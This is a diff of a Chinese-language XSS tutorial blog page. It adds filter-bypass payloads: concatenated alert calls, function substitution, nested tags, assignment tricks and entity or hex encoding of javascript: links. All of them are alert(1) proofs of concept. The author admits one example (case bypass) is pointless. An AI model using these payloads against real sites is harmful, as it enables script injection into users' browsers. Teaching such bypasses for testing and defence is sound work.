@@ -156,7 +156,7 @@
 <h3 id="3-HTML属性值"><a href="#3-HTML属性值" class="headerlink" title="3.HTML属性值"></a>3.HTML属性值</h3><p>例如，我们将<code>&lt;script&gt;</code>恶意代码插入到了<code>&lt;img&gt;</code>标签的oneerror属性中，从而欺骗浏览器执行恶意代码</p>
 <p>当image图片无法显示时，会调用onerror属性，从而执行恶意脚本</p>
 <h3 id="4-直接插入到script，svg，img，css标签"><a href="#4-直接插入到script，svg，img，css标签" class="headerlink" title="4.直接插入到script，svg，img，css标签"></a>4.直接插入到script，svg，img，css标签</h3><p>当用户运行到此代码时，便会运行XSS</p>
-<h3 id="5-插入到HTTP相应中"><a href="#5-插入到HTTP相应中" class="headerlink" title="**5.插入到HTTP相应中"></a>**5.插入到HTTP相应中</h3><p>（XSS脚本是在浏览器上运行时展开攻击的，所以应该插入到响应包中，而不是请求包中）</p>
+<h3 id="5-插入到HTTP响应中"><a href="#5-插入到HTTP响应中" class="headerlink" title="**5.插入到HTTP响应中"></a>**5.插入到HTTP响应中</h3><p>（XSS脚本是在浏览器上运行时展开攻击的，所以应该插入到响应包中，而不是请求包中）</p>
 <p>这里牵扯到CRLF漏洞，简单介绍：</p>
 <h4 id="CRLF漏洞"><a href="#CRLF漏洞" class="headerlink" title="CRLF漏洞"></a>CRLF漏洞</h4><p>CRLF是“回车+换行”（\r\n）的简称，在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的。它们通常被一起使用来表示一行的结束。浏览器根据这两个CRLF来取出HTTP内容并显示出来。</p>
 <p><strong>提及：回车（%0d）指光标到行首，而换行（%0a）指光标到下一行。一般而言，回车加换行指新开启一行。当然在windows中，单点换行就已经具有回车+换行的作用了</strong></p>
@@ -180,7 +180,7 @@
 
 <p><strong>可以发现我们利用CRLF漏洞将http包分为了header和body，利用回车符&#x2F;换行符成功执行了body中的代码，实现XSS</strong></p>
 <p><strong>如果遇到XSS过滤的情况我们还可以在httpheader中注入X-XSS-Protection:0（停止使用浏览器的XSS过滤功能），可绕过浏览器的过滤规则实现XSS弹窗显示。</strong></p>
-<h1 id="5-XSS的绕过"><a href="#5-XSS的绕过" class="headerlink" title="5.XSS的绕过"></a>5.XSS的绕过</h1><h2 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h2><p>源码示例</p>
+<h1 id="5-XSS的绕过"><a href="#5-XSS的绕过" class="headerlink" title="5.XSS的绕过"></a>5.XSS的绕过</h1><h2 id="1-关键词绕过"><a href="#1-关键词绕过" class="headerlink" title="1.关键词绕过"></a>1.关键词绕过</h2><h3 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h3><p>源码示例</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;XSS漏洞示例&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;搜索结果&lt;/h1&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">      $q = isset($_GET[&#x27;q&#x27;]) ? $_GET[&#x27;q&#x27;] : &#x27;&#x27;;</span><br><span class="line">      $q = strtolower($q); </span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;p&gt;你搜索的关键词是：&lt;?php echo $q; ?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      var searchQuery = &#x27;&lt;?php echo $q; ?&gt;&#x27;;</span><br><span class="line">      document.write(&quot;&lt;p&gt;搜索结果为：&quot; + searchQuery + &quot;&lt;/p&gt;&quot;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>上面的代码运用了php中的一个strtolower()函数，将字符串转为小写，但是我们可以利用大小写绕过</p>
@@ -188,7 +188,55 @@
 
 <p>发现成功弹窗</p>
 <p>解析：如果用户输入的查询参数 <code>q</code> 为 <code>&lt;sCriPt&gt;alert(1)&lt;sCriPt&gt;</code>，由于 <code>strtolower()</code> 只处理字母的大小写，它不会删除或转义 HTML 标签，因此最终输出到页面和 JavaScript 中的内容仍然包含原始的脚本标签。这样，当浏览器解析并执行 JavaScript 时，就会执行 <code>alert(1)</code>，这就是一个典型的 XSS 攻击。</p>
-<h2 id="2-编码绕过"><a href="#2-编码绕过" class="headerlink" title="2.编码绕过"></a>2.编码绕过</h2>
+<p><strong>不是哥们，标签对大小写不敏感啊，你写个<sCriPt>放在这里又不会被当成文本你放在大小写绕过这有啥用啊淦。</strong></p>
+<h3 id="2-拼接绕过"><a href="#2-拼接绕过" class="headerlink" title="2.拼接绕过"></a>2.拼接绕过</h3><p>（alert函数用于弹出警告框，该函数在许多浏览器中都会被过滤掉，所以这里采用拼接的方式执行alert函数，for example）</p>
+<p><strong>0x01. eval</strong>：用于执行字符串表达式，通常执行字符串内的代码，但是在这里，eval期望执行字符串而不是函数，所以可以删掉eval</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x02. top</strong>：用于访问最顶层的窗口（例如有多层网页用ifram嵌套的时候），在顶层窗口弹出警告</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x03. window</strong>：用于访问当前浏览器窗口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x04. self</strong>：和windows效果差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x05. parent</strong>：和top效果差不多，但是parent仅指父窗口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x06. frames</strong>：和parent效果差不多，但frames是页面内的所有框架，也就是子窗口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-函数替换"><a href="#3-函数替换" class="headerlink" title="3.函数替换"></a>3.函数替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上述只是用img标签进行展示，当然别的地方也可以这么用。</p>
+<h3 id="4-嵌套绕过"><a href="#4-嵌套绕过" class="headerlink" title="4.嵌套绕过"></a>4.嵌套绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提升了代码的复杂性，可能可以绕过浏览器的过滤机制</p>
+<h3 id="5-赋值绕过"><a href="#5-赋值绕过" class="headerlink" title="5.赋值绕过"></a>5.赋值绕过</h3><p>（类似于拼接绕过）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-编码绕过"><a href="#2-编码绕过" class="headerlink" title="2.编码绕过"></a>2.编码绕过</h2><p>简单来说就是将一些字符通过某种编码的形式进行转换从而进行（避免）xss攻击</p>
+<h3 id="1-html实体编码转义（及其应对）"><a href="#1-html实体编码转义（及其应对）" class="headerlink" title="1.html实体编码转义（及其应对）"></a><strong>1.html实体编码转义</strong>（及其应对）</h3><p>当我们的可控点为单个标签属性时，可以使用 html 实体编码。</p>
+<p><strong>被实体转换后的字符不会再被当做代码来执行，有效防护了xss</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;test&lt;iframe&gt;</span><br><span class="line">&lt;script&gt;可控点&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;</span><br><span class="line">实体转移（）：&lt;a href=&quot;javascript:alert&amp;#40;1&amp;#41;&quot;&gt;aaa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>为了应对实体代码转义，我们可以：</strong></em></p>
+<p><strong>十进制绕过</strong>，这样就可以简单地绕过实体编码转义啦？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript&amp;#58;alert(1)&gt;aaa&lt;/a&gt;</span><br><span class="line">在这里把：替换为&amp;#58；（分号可以省略）</span><br></pre></td></tr></table></figure>
+
+<p><strong>十六进制绕过</strong>(如果题目过滤了分号，这里其实也可以把分号删去)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;aaa&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;java%73%63%72%69%70%74%3Aalert%281%29&quot;&gt;aaa&lt;/a&gt;</span><br><span class="line">完全采用16进制如下：（在16进制表示中进行0的填充保持一致性）</span><br><span class="line">&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
     
     
     <footer class="meta">
